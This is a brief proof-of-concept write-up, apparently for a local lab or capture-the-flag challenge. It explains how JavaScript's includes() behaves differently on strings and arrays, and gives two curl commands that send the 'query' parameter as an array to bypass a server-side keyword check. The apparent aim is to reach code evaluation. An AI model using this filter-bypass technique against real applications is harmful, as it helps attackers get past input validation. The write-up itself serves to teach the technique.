# POC

## JavaScript Type Confusion
JavaScript has several methods that are shared between multiple built-in types but behave differently depending on the type. One of them is ```includes()```.

This method exists on both String and Array, but works differently:
- **String**: it checks if a substring exists.
- **Array**: it checks if an element exists.


These methods behave differently, depending on the type of input on which they are called on. 

## Exploit
### Option 1: Sending multiple Parameters
```
curl -X POST http://localhost:1337/search -d "query=randomBytes(16).toString('hex')&query"
```
The data sent will be checked as an array like ```["randomBytes(16).toString('hex')",""]```. Since "String" is not one of the array elements, ```.includes("String")``` returns false and the first check is bypassed.


### Option 2: Sending an Explicit Array
```
curl -X POST http://localhost:1337/search -d "query[]=randomBytes(16).toString('hex')
```